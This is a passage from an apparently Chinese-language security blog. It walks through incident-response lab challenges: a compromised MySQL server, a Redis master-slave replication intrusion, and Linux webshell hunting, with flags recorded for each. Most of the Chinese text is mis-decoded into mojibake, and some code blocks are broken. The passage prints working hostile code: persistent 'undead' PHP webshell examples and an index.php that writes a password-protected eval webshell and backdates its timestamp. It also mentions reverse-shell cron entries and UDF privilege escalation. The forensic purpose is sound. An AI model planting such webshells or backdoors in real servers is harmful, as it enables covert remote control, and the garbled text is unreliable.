alt="image-20240711183039409"></p><p>æœç„¶æœ‰ï¼Œflag{ccfda79e-7aa1-4275-bc26-a6189eb9a20b}</p><p>ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨æ²³é©¬æŸ¥æ€ï¼Œåˆšå­¦åˆ°çš„ï¼Œä¸‹è½½ä¹Ÿå¾ˆå¿«ï¼Œè¿™æ˜¯å®˜ç½‘ï¼š<a href="https://www.shellpub.com/doc/hm_linux_usage.html">https://www.shellpub.com/doc/hm_linux_usage.html</a></p><p>ç”¨æ³•ä¹Ÿå¾ˆç®€å•</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ä¸‹è½½è§£å‹ç¼©</span><br>wget -O /opt/hm-linux.tgz http://dl.shellpub.com/hm/latest/hm-linux-amd64.tgz?version=1.7.0<br><span class="hljs-built_in">cd</span> /opt<br>tar xvf hm-linux.tgz<br><span class="hljs-comment"># ä½¿ç”¨</span><br>./hm deepscan &lt;è¦æ‰«æçš„ç›®å½•&gt; <span class="hljs-comment"># æ·±åº¦æ‰«æï¼Œæ‰«æå®Œæˆä¹‹åç»“æœä¼šä¿å­˜ä¸ºresult.csvæ–‡ä»¶</span><br>./hm scan &lt;è¦æ‰«æçš„ç›®å½•&gt; <span class="hljs-comment">#æ‰«æå®Œæˆä¹‹åç»“æœä¼šä¿å­˜ä¸ºresult.csvæ–‡ä»¶ï¼Œä½¿ç”¨è®°äº‹æœ¬æˆ–è€…excelæ‰“å¼€æŸ¥çœ‹</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644896.png" alt="image-20240711183620135"></p><p>æŸ¥æ‰¾åå¼¹shellçš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹error.logæœ‰æ²¡æœ‰ä»€ä¹ˆå¼‚å¸¸çš„åœ°æ–¹</p><p><img src="http://cdn.clown2024.cn/202407151644897.png" alt="image-20240711183935052"></p><p>æ„Ÿè§‰&#x2F;tmp&#x2F;1.shæœ‰ç‚¹å¥‡æ€ªï¼Œå»çœ‹ä¸€ä¸‹</p><p><img src="http://cdn.clown2024.cn/202407151644898.png" alt="image-20240711184013639"></p><p>å¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªbashçš„åå¼¹shellæŒ‡ä»¤ï¼Œæ‰¾åˆ°åå¼¹çš„åœ°å€ï¼Œflag{192.168.100.13}</p><p>è¿™ä¸ªæ–‡ä»¶åœ¨&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;ä¸‹ä¹Ÿæœ‰</p><p><img src="http://cdn.clown2024.cn/202407151644899.png" alt="image-20240712001549368"></p><p>å¯»æ‰¾é»‘å®¢ææƒçš„å®Œæ•´è·¯å¾„ï¼Œè¿™é‡Œèƒ½å¤Ÿææƒåº”è¯¥æ³„éœ²äº†ä¸€äº›ç”¨æˆ·ä¿¡æ¯ï¼Œæˆ‘ä»¬å‘ç°åœ¨webç›®å½•ä¸‹çš„common.phpé‡Œé¢æœ‰rootç”¨æˆ·çš„ä¿¡æ¯</p><p><img src="http://cdn.clown2024.cn/202407151644900.png" alt="image-20240712002457267"></p><p>mysqlå¸¸è§„çš„ææƒå¥—è·¯å°±æ˜¯udfææƒï¼Œå¦‚æœæ˜¯çš„è¯é‚£ä¹ˆåº”è¯¥å°±ä¼šåœ¨ &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;ç•™ä¸‹æ–‡ä»¶ç—•è¿¹ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹</p><p><img src="http://cdn.clown2024.cn/202407151644901.png" alt="image-20240711184502176"></p><p>é‚£ææƒè·¯å¾„å°±æ˜¯&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;udf.soï¼Œflag{b1818bde4e310f3d23f1005185b973e7}</p><p>æŸ¥çœ‹ææƒåçš„æƒé™ï¼Œçœ‹ä¸€ä¸‹è¿›ç¨‹è¯¦ç»†ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ps -aux<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644902.png" alt="image-20240711184705362"></p><p>å¯ä»¥çœ‹åˆ°åº”è¯¥æ˜¯é‚£ä¸ªmysqlçš„ç”¨æˆ·ï¼Œé‚£ä¹ˆæƒé™å°±æ˜¯flag{mysql}</p><p>æˆ–è€…è¿›å…¥åˆ°mysqlé‡Œé¢ç”¨**select sys_eval(â€œwhoamiâ€);**æŸ¥çœ‹å½“å‰ç”¨æˆ·</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/JACKBREAK/article/details/139037618">https://blog.csdn.net/JACKBREAK/article/details/139037618</a></p><h1 id="redisåº”æ€¥å“åº”"><a href="#redisåº”æ€¥å“åº”" class="headerlink" title="redisåº”æ€¥å“åº”"></a>redisåº”æ€¥å“åº”</h1><p>é¶æœºä»‹ç»</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">æœåŠ¡å™¨åœºæ™¯æ“ä½œç³»ç»Ÿ Linux<br>æœåŠ¡å™¨è´¦å·å¯†ç  root xjredis<br><br>ä»»åŠ¡ç¯å¢ƒè¯´æ˜<br>    æ³¨ï¼šæ ·æœ¬è¯·å‹¿åœ¨æœ¬åœ°è¿è¡Œï¼ï¼ï¼æ ·æœ¬è¯·å‹¿åœ¨æœ¬åœ°è¿è¡Œï¼ï¼ï¼æ ·æœ¬è¯·å‹¿åœ¨æœ¬åœ°è¿è¡Œï¼ï¼ï¼<br>    åº”æ€¥å“åº”å·¥ç¨‹å¸ˆå°ç‹æŸäººæ”¶åˆ°å®‰å…¨è®¾å¤‡å‘Šè­¦æœåŠ¡å™¨è¢«æ¤å…¥æ¶æ„æ–‡ä»¶ï¼Œè¯·ä¸Šæœºæ’æŸ¥<br></code></pre></td></tr></table></figure><p>æ­¥éª¤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢æ”»å‡»æˆåŠŸçš„ IP ä¸ºå¤šå°‘,å°†é»‘å®¢ IP ä½œä¸º FLAG æäº¤;<br>é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢ç¬¬ä¸€æ¬¡ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶,å°†é»‘å®¢ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶é‡Œé¢çš„ FLAG æäº¤;<br>é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢åå¼¹ shell çš„IP ä¸ºå¤šå°‘,å°†åå¼¹ shell çš„IP ä½œä¸º FLAG æäº¤;<br>é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”æº¯æºåˆ†æé»‘å®¢çš„ç”¨æˆ·åï¼Œå¹¶ä¸”æ‰¾åˆ°é»‘å®¢ä½¿ç”¨çš„å·¥å…·é‡Œçš„å…³é”®å­—ç¬¦ä¸²(flag&#123;é»‘å®¢çš„ç”¨æˆ·-å…³é”®å­—ç¬¦ä¸²&#125; æ³¨å…³é”®å­—ç¬¦ä¸² xxx-xxx-xxx)ã€‚å°†ç”¨æˆ·åå’Œå…³é”®å­—ç¬¦ä¸²ä½œä¸º FLAGæäº¤<br>é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢ç¯¡æ”¹çš„å‘½ä»¤,å°†é»‘å®¢ç¯¡æ”¹çš„å‘½ä»¤é‡Œé¢çš„å…³é”®å­—ç¬¦ä¸²ä½œä¸º FLAG æäº¤;<br></code></pre></td></tr></table></figure><p>é‚£å°±å…ˆå»çœ‹ä¸€ä¸‹redisçš„æ—¥å¿—åœ¨&#x2F;var&#x2F;logä¸‹é¢</p><p><img src="http://cdn.clown2024.cn/202407151644903.png" alt="image-20240712004115278"></p><p>è¿™é‡Œæ‰¾åˆ°ä¸€å¼ ä¸»ä»å¤åˆ¶æ—¶çš„é€šä¿¡è¿‡ç¨‹å›¾ï¼Œæ‰€ä»¥æœ‰<strong>Master replied to PING</strong>çš„å­—æ®µå³ä¸ºè¿æ¥æˆåŠŸ</p><p><img src="http://cdn.clown2024.cn/202407151644904.png" alt="image-20240712011533382"></p><p><img src="http://cdn.clown2024.cn/202407151644905.png" alt="image-20240712004200679"></p><p>è¿™é‡Œå¾ˆæ˜æ˜¾åº”è¯¥æ˜¯ä¸€ä¸ªredisçš„ä¸»ä»å¤åˆ¶ï¼Œä½†æ˜¯éƒ½æ˜¯å¤±è´¥è¿æ¥ï¼Œå†å¾€ä¸‹è¿˜æœ‰å°è¯•å…¶ä»–ipçš„è¿æ¥ï¼Œæœ€åæˆåŠŸçš„æ˜¯20çš„ip</p><p><img src="http://cdn.clown2024.cn/202407151644906.png" alt="image-20240712004754137"></p><p>flag{192.168.100.20}</p><p>æ—¢ç„¶æ˜¯ä¸»ä»å¤åˆ¶é‚£ä¸€èˆ¬å°±ä¼šä¸Šä¼ æœ‰soæ–‡ä»¶ï¼Œæˆ‘ä»¬ç”¨å‘½ä»¤æŸ¥çœ‹soæ–‡ä»¶åœ¨å“ªé‡Œ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&#x27;exp.so&#x27;</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644907.png" alt="image-20240712005221837"></p><p>å¯ä»¥çœ‹åˆ°åœ¨æ ¹ç›®å½•ä¸‹ï¼Œæˆ‘ä»¬æŸ¥çœ‹å†…å®¹é‡Œé¢æœ‰flag</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xxd /exp.so<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644908.png" alt="image-20240712005512837"></p><p>flag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b}</p><p>çœ‹ä¸€ä¸‹å®šæ—¶ä»»åŠ¡æ‰¾åå¼¹shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">corntab -l<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644909.png" alt="image-20240712005613810"></p><p>flag{192.168.10.13}</p><p>æº¯æºå¯ä»¥å»çœ‹ä¸€ä¸‹.sshä¸‹çš„authorized_keys</p><p><img src="http://cdn.clown2024.cn/202407151644910.png" alt="image-20240712005919183"></p><p>æ‰¾åˆ°äº†ä»–çš„ç”¨æˆ·å</p><p>xj-test-userï¼Œç„¶åå»githubä¸Šçœ‹ä¸€ä¸‹è¯¥ç”¨æˆ·ï¼Œå¯ä»¥æ‰¾åˆ°ä»–ä½¿ç”¨çš„å·¥å…·</p><p><img src="http://cdn.clown2024.cn/202407151644911.png" alt="image-20240712010113376"></p><p>å†å»æ‰¾ä»–çš„å†å²commit</p><p><img src="http://cdn.clown2024.cn/202407151644912.png" alt="image-20240712010420376"></p><p>åœ¨first commité‡Œé¢</p><p><img src="http://cdn.clown2024.cn/202407151644913.png" alt="image-20240712010539821"></p><p>flag{xj-test-user-wow-you-find-flag}</p><p>æœ€åæŸ¥æ‰¾ç¯¡æ”¹çš„å‘½ä»¤ï¼Œå¯ä»¥ç›´æ¥å»&#x2F;usr&#x2F;binç›®å½•ä¸‹æŸ¥çœ‹ï¼Œè¿™é‡Œæ”¹çš„æ˜¯pså‘½ä»¤ï¼Œæˆ‘å°±è¯´ä¸€å¼€å§‹ç”¨pså‘½ä»¤ä¸ºä»€ä¹ˆæ€ªæ€ªçš„</p><p><img src="http://cdn.clown2024.cn/202407151644914.png" alt="image-20240712011217461"></p><p>flag{c195i2923381905517d818e313792d196}</p>]]></content>
      
      
      <categories>
          
          <category> åº”æ€¥å“åº” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åº”æ€¥å“åº” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç„æœºåº”æ€¥å“åº”é¶åœº-ç¬¬ä¸€ç« </title>
      <link href="/2024/07/02/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0/"/>
      <url>/2024/07/02/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="linuxå…¥ä¾µæ’æŸ¥"><a href="#Linuxå…¥ä¾µæ’æŸ¥" class="headerlink" title="Linuxå…¥ä¾µæ’æŸ¥"></a>Linuxå…¥ä¾µæ’æŸ¥</h1><p>è¿™æ˜¯é¶æœºçš„ç®€ä»‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">è´¦å·ï¼šroot å¯†ç ï¼šlinuxruqin<br>ssh root@IP<br>1.webç›®å½•å­˜åœ¨æœ¨é©¬ï¼Œè¯·æ‰¾åˆ°æœ¨é©¬çš„å¯†ç æäº¤<br>2.æœåŠ¡å™¨ç–‘ä¼¼å­˜åœ¨ä¸æ­»é©¬ï¼Œè¯·æ‰¾åˆ°ä¸æ­»é©¬çš„å¯†ç æäº¤<br>3.ä¸æ­»é©¬æ˜¯é€šè¿‡å“ªä¸ªæ–‡ä»¶ç”Ÿæˆçš„ï¼Œè¯·æäº¤æ–‡ä»¶å<br>4.é»‘å®¢ç•™ä¸‹äº†æœ¨é©¬æ–‡ä»¶ï¼Œè¯·æ‰¾å‡ºé»‘å®¢çš„æœåŠ¡å™¨ipæäº¤<br>5.é»‘å®¢ç•™ä¸‹äº†æœ¨é©¬æ–‡ä»¶ï¼Œè¯·æ‰¾å‡ºé»‘å®¢æœåŠ¡å™¨å¼€å¯çš„ç›‘ç«¯å£æäº¤<br></code></pre></td></tr></table></figure><p>å…ˆç®€å•äº†è§£ä¸€ä¸‹ä¸æ­»é©¬ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://cloud.tencent.com/developer/article/1922141">https://cloud.tencent.com/developer/article/1922141</a></p><p><a href="https://blog.csdn.net/weixin_44411509/article/details/129267982">https://blog.csdn.net/weixin_44411509/article/details/129267982</a></p><p>ä¸æ­»é©¬çš„åŸç†å°±æ˜¯å…¶è¿›ç¨‹ä¸ä¼šæ¶ˆäº¡ï¼Œåœ¨å†…å­˜ä¸­ä¸æ–­åˆ›å»ºæœ¨é©¬æ–‡ä»¶ï¼Œä»è€Œè¾¾åˆ°æ— æ³•åˆ é™¤çš„ç›®çš„ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¸æ­»é©¬ä¾‹å­ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>                                                                                                               <span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string">file_put_contents(&quot;shell.php&quot;, $content);</span><br><span class="hljs-string">usleep(10000);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1. ignore_user_abort()å‡½æ•°ï¼šå‡½æ•°è®¾ç½®ä¸å®¢æˆ·æœºæ–­å¼€æ˜¯å¦ä¼šç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œï¼Œå¦‚æœè®¾ç½®ä¸ºtrueï¼Œåˆ™å¿½ç•¥ä¸ç”¨æˆ·çš„æ–­å¼€ï¼›ä¹Ÿå°±æ˜¯è®¿é—®äº†è¿™ä¸ªé¡µé¢ä¹‹åï¼Œè„šæœ¬ä¼šä¸€ç›´åœ¨åå°æ‰§è¡Œã€‚<br>2. set_time_limit()å‡½æ•°ï¼šè®¾ç½®å…è®¸è„šæœ¬è¿è¡Œçš„æ—¶é—´ï¼Œå•ä½ä¸ºç§’ã€‚å¦‚æœè®¾ç½®ä¸º0ï¼ˆé›¶ï¼‰ï¼Œæ²¡æœ‰æ—¶é—´æ–¹é¢çš„é™åˆ¶ã€‚<br>3. unlink(__FILE__)å‡½æ•°ï¼šåˆ é™¤æ–‡ä»¶æœ¬èº«ã€‚<br>4. file_put_contentså‡½æ•°ï¼šå°†ä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ã€‚<br>5. usleepå‡½æ•°ï¼šå»¶è¿Ÿæ‰§è¡Œå½“å‰è„šæœ¬è‹¥å¹²å¾®ç§’ï¼ˆä¸€å¾®ç§’ç­‰äºä¸€ç™¾ä¸‡åˆ†ä¹‹ä¸€ç§’ï¼‰ã€‚<br></code></pre></td></tr></table></figure><p>è¿˜å¯ä»¥ç»™ä¸æ­»é©¬åŠ ä¸€ä¸ªå¯†ç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>                                                                                                                                                                                                     <span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string">    while (1)&#123;</span><br><span class="hljs-string">        file_put_contents($file,$code);</span><br><span class="hljs-string">        usleep(5000);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¦æ¸…é™¤ä¸æ­»é©¬çš„è¯å°±éœ€è¦é€šè¿‡é‡å¯ä¸»æœºæˆ–æœåŠ¡ï¼Œæˆ–è€…æ¡ä»¶ç«äº‰çš„æ–¹å¼ä¿®æ”¹æ–‡ä»¶å†…å®¹</p><p><strong>å¼€å§‹æ’æŸ¥</strong></p><p>å…ˆè¿›webç›®å½•ï¼Œçœ‹åˆ°ä¸€ä¸ª1.phpé‡Œé¢æ˜¯ä¸€å¥è¯æœ¨é©¬</p><p><img src="http://cdn.clown2024.cn/202407151645934.png" alt="image-20240709111702355"></p><p>æŸ¥çœ‹å¼€æ”¾çš„ç«¯å£ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">netstat -pantu<br><span class="hljs-meta prompt_">#</span><span class="language-bash">--------</span><br>-p è¡¨ç¤ºæ˜¾ç¤ºè¿›ç¨‹æ ‡è¯†ç¬¦å’Œ/æˆ–è¿›ç¨‹åç§°ï¼Œè¿™å¯ä»¥å¸®åŠ©ä½ æŸ¥çœ‹å“ªä¸ªè¿›ç¨‹æ­£åœ¨ä½¿ç”¨ç½‘ç»œè¿æ¥ã€‚<br>-a è¡¨ç¤ºæ˜¾ç¤ºæ‰€æœ‰æ´»åŠ¨çš„ TCP è¿æ¥å’Œç›‘å¬ç«¯å£ã€‚<br>-n è¡¨ç¤ºä»¥æ•°å­—å½¢å¼æ˜¾ç¤ºåœ°å€å’Œç«¯å£å·ï¼Œä¸è¿›è¡ŒåŸŸåè§£æã€‚<br>-t è¡¨ç¤ºæ˜¾ç¤º TCP è¡¨ã€‚<br>-u è¡¨ç¤ºæ˜¾ç¤º UDP è¡¨ã€‚<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645935.png" alt="image-20240709112640729"></p><p>ç”¨è¯¥å‘½ä»¤æŸ¥æ‰¾ç‰¹å¾æ–‡ä»¶ï¼š</p><figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">find ./ -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br><span class="hljs-comment">#å°†æ ‡å‡†è¾“å…¥æ•°æ®è½¬æ¢æˆå‘½ä»¤è¡Œå‚æ•°ï¼Œä¹Ÿå°±æ˜¯å°†findçš„è¾“å…¥å˜æˆå‘½ä»¤è¡Œå‚æ•°ä¼ é€’ç»™grepå‘½ä»¤</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645936.png" alt="image-20240709112605958"></p><p>å»æŸ¥ä¸€ä¸‹å¯†ç ä¸º<strong>hello</strong></p><p><img src="http://cdn.clown2024.cn/202407151645937.png" alt="image-20240709112733521"></p><p>çœ‹ä¸€ä¸‹index.phpçš„å†…å®¹å¯ä»¥çŸ¥é“é€šè¿‡è¯¥æ–‡ä»¶ç”Ÿæˆï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(SYS_ROOT.INC.<span class="hljs-string">&#x27;common.php&#x27;</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>].(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]?<span class="hljs-string">&#x27;?&#x27;</span>.<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;?&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$path</span>, <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)==<span class="hljs-string">&#x27;/&#x27;</span>)&#123;<br>        <span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$path</span>,<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-variable">$path</span> = <span class="hljs-title class_">Base</span>::<span class="hljs-title function_ invoke__">safeword</span>(<span class="hljs-variable">$path</span>);<br><span class="hljs-variable">$ctrl</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]:<span class="hljs-string">&#x27;run&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;createprocess&#x27;</span>]))<br>&#123;<br>        <span class="hljs-title class_">Index</span>::<span class="hljs-title function_ invoke__">createhtml</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]:<span class="hljs-number">0</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cat&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;single&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title class_">Index</span>::<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$path</span>);<br>&#125;<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;/var/www/html/.shell.php&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$code</span>);<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2021-01-01 00:00:01&quot; .shell.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">3000</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>é»‘å®¢ç•™äº†ä¸€ä¸ªæœ¨é©¬æ–‡ä»¶ï¼Œå°±æ˜¯<strong>shell(1).elf</strong>æ–‡ä»¶</p><p><img src="http://cdn.clown2024.cn/202407151645938.png" alt="image-20240709113120553"></p><p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰å¯æ‰§è¡Œæƒé™ï¼Œè¿™é‡ŒåŠ ä¸€ä¸ªæƒé™ï¼Œç„¶åå¼€å¦ä¸€ä¸ªç«¯å£æŸ¥çœ‹ç«¯å£æƒ…å†µ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 777 shell\(1\).elf<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645939.png" alt="image-20240709113441330"></p><p>æœ€åå¯ä»¥çœ‹åˆ°å…¶ipä¸º<strong>10.11.55.21</strong>ï¼Œç«¯å£ä¸º3333</p><p>æœ€ç»ˆçš„å„ä¸ªflagå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">flag&#123;1&#125;<br>flag&#123;hello&#125;<br>flag&#123;index.php&#125;<br>flag&#123;10.11.55.21&#125;<br>flag&#123;3333&#125;<br></code></pre></td></tr></table></figure><h2 id="ç”¨å·¥å…·çš„åšæ³•"><a href="#ç”¨å·¥å…·çš„åšæ³•" class="headerlink" title="ç”¨å·¥å…·çš„åšæ³•"></a>ç”¨å·¥å…·çš„åšæ³•</h2><p>ç”¨Dç›¾æ¥è¿›è¡Œæ‰«æ,ä¸è¿‡Dç›¾æ²¡æœ‰Linuxç‰ˆæœ¬ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡å°†è¿œç¨‹çš„Linuxæ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°Windowsä¸Šé¢ï¼Œç„¶åç”¨Dç›¾æ‰«å³å¯ã€‚</p><p>è¿™é‡Œå‚è€ƒè¿™ç¯‡æ–‡ç« æ¥å¸ƒç½®ï¼š<a href="https://developer.aliyun.com/article/1341008">https://developer.aliyun.com/article/1341008</a></p><p>é‡‡ç”¨çš„æ–¹æ³•æ˜¯<strong>winfsp + sshfs-win</strong>ï¼Œè¿™ä¸¤ä¸ªç›´æ¥ç½‘ä¸Šä¸‹è½½å®‰è£…å¥½å³å¯ï¼š<a href="https://winfsp.dev/rel/">https://winfsp.dev/rel/</a></p><p>ç¬¬ä¸€ç§æ–¹æ³•æ˜¯å³å‡»æ­¤ç”µè„‘é€‰æ‹©æ˜ å°„ç½‘ç»œé©±åŠ¨å™¨ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151645940.png" alt="image-20240709122109922"></p><blockquote><p>æˆ–è€…è¾“å…¥sshfs.rï¼Œsshfsæ˜¯æŒ‚è½½ç”¨æˆ·å®¶ç›®å½•ï¼Œsshfs.ræ˜¯æŒ‚è½½è¿œç¨‹çš„æ ¹ç›®å½•</p><p>ç‚¹å‡»å®Œæˆåè¾“å…¥å¯†ç å³å¯æŒ‚è½½</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151645941.png" alt="image-20240709122150458"></p><p>ç„¶åç›´æ¥ç”¨Dç›¾è¿›è¡Œæ‰«æwebç›®å½•ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151645942.png" alt="image-20240709122701725"></p><p>æˆ–è€…ç”¨sshfs-manage(sshfsçš„ç•Œé¢åŒ–å·¥å…·ï¼Œè¦å•ç‹¬å†å»ä¸‹è½½)å°†Linuxç›®å½•æŒ‚è½½åˆ°Windowsï¼Œè¿™é‡Œå°±æ‡’å¾—è¯•äº†ğŸ˜¥</p><p>è¿˜å¯ä»¥ç”¨net useå‘½ä»¤æŒ‚è½½ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">net use              //åˆ—å‡ºæ‰€æœ‰ç½‘ç»œè¿æ¥<br>net use Z: /del      //åˆ é™¤æœ¬æœºæ˜ å°„çš„Zç›˜ <br>net use * /del /y    //åˆ é™¤æ‰€æœ‰æ˜ å°„å’ŒIPC$<br>net use Z: \\sshfs\root@192.168.1.120\/         //å°†å¯¹æ–¹æ ¹ç›®å½•æ˜ å°„ä¸ºZç›˜<br>net use Z: \\sshfs.r\root@192.168.1.120         //å°†å¯¹æ–¹æ ¹ç›®å½•æ˜ å°„ä¸ºZç›˜<br>net use Z: \\sshfs.r\root@192.168.1.120!1234    //å°†å¯¹æ–¹æ ¹ç›®å½•æ˜ å°„ä¸ºZç›˜ï¼ˆå…¶ä»–ç«¯å£ï¼‰<br></code></pre></td></tr></table></figure><h1 id="weshellæŸ¥æ€"><a href="#weshellæŸ¥æ€" class="headerlink" title="weshellæŸ¥æ€"></a>weshellæŸ¥æ€</h1><p>é¶æœºç®€ä»‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">é¶æœºè´¦å·å¯†ç  root xjwebshell<br>1.é»‘å®¢webshellé‡Œé¢çš„flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;<br>2.é»‘å®¢ä½¿ç”¨çš„ä»€ä¹ˆå·¥å…·çš„shell githubåœ°å€çš„md5 flag&#123;md5&#125;<br>3.é»‘å®¢éšè—shellçš„å®Œæ•´è·¯å¾„çš„md5 flag&#123;md5&#125; æ³¨ : /xxx/xxx/xxx/xxx/xxx.xxx<br>4.é»‘å®¢å…æ€é©¬å®Œæ•´è·¯å¾„ md5 flag&#123;md5&#125;<br></code></pre></td></tr></table></figure><p>ç›´æ¥ä¸ŠDç›¾æ‰«ï¼Œç”¨çš„è¿˜æ˜¯ä¸Šé¢çš„æ–¹æ³•</p><p><img src="http://cdn.clown2024.cn/202407151645943.png" 